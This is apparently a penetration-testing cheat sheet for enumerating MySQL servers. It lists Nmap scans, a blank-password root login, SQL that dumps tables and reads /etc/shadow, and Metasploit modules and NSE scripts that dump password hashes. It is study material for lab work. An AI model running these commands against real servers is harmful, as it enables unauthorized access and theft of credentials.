
# ğŸ¬ MySQL Enumeration 

## ğŸ§  1. Getting IP Address of Target

Use any technique like `ifconfig.me`, `ip a`, or Nmap host discovery to get the target IP.

---

## ğŸ›°ï¸ 2. Basic Nmap Scan of MySQL

```bash
nmap <IP>
```

ğŸ” Scans the host to check for open ports.

```bash
nmap <IP> -sV -p 3306
```

ğŸ” Scans port `3306` (default MySQL port) and tries to detect the service version.

---

## ğŸ” 3. Attempt to Login to MySQL

```bash
mysql -h <IP> -u root
```

â˜‘ï¸ Attempts to connect to the MySQL server as `root` without a password.

If login is successful:

```sql
SHOW DATABASES;
USE <database_name>;
SELECT * FROM authors;
SELECT LOAD_FILE('/etc/shadow');
EXIT;
```

ğŸ“ Notes:

* `SHOW DATABASES;` â€“ Lists all databases.
* `USE <database_name>;` â€“ Switch to the selected database.
* `SELECT * FROM authors;` â€“ Dump data from `authors` table.
* `SELECT LOAD_FILE('/etc/shadow');` â€“ Tries to read `/etc/shadow` file (possible only if file\_read permissions are misconfigured).
* `EXIT;` â€“ Close MySQL shell.

---

## ğŸ’£ 4. Using Metasploit for MySQL Enumeration

### ğŸ” Writable Directory Scan

```bash
msfconsole
use auxiliary/scanner/mysql/mysql_writable_dirs
options
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set RHOSTS <IP>
set VERBOSE false
set PASSWORD ""
run
```

ğŸ’¡ **Purpose**: Scans for writable directories inside MySQL.

---

### ğŸ§Š Hashdump from MySQL

```bash
use auxiliary/scanner/mysql/mysql_hashdump
options
set USERNAME root
set PASSWORD ""
exploit
```

ğŸ” Dumps password hashes from the MySQL server if accessible.

---

## ğŸ”¬ 5. MySQL NSE Scripts with Nmap

### ğŸ”“ Check for Empty Password

```bash
nmap <IP> -sV -p 3306 --script=mysql-empty-password
```

âœ”ï¸ Checks if the MySQL server allows login with a blank password.

---

### ğŸ§¾ Get MySQL Server Info

```bash
nmap <IP> -sV -p 3306 --script=mysql-info
```

ğŸ“‹ Retrieves information about the MySQL server version and configuration.

---

### ğŸ‘¤ Get MySQL Users

```bash
nmap <IP> -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
```

ğŸ“ Lists all users in MySQL using provided credentials.

---

### ğŸ—„ï¸ List Databases

```bash
nmap <IP> -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
```

ğŸ—ƒï¸ Dumps the database names from the target MySQL server.

---

### âš™ï¸ MySQL System Variables

```bash
nmap <IP> -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
```

ğŸ”§ Retrieves internal system variables and configurations.

---

### âœ… Audit MySQL Security (CIS Benchmark)

```bash
nmap <IP> -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
```

ğŸ›¡ï¸ Runs security audit checks on the MySQL server using CIS rules.

---

### ğŸ” Dump MySQL Hashes

```bash
nmap <IP> -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
```

ğŸ§‚ Dumps the hashed passwords stored in the MySQL server.

---

### â“ Run Custom Query

```bash
nmap <IP> -sV -p 3306 --script=mysql-query --script-args="query='SELECT COUNT(*) FROM book.authors;',username='root',password=''"
```

ğŸ“Š Executes a custom query on the MySQL server.


---

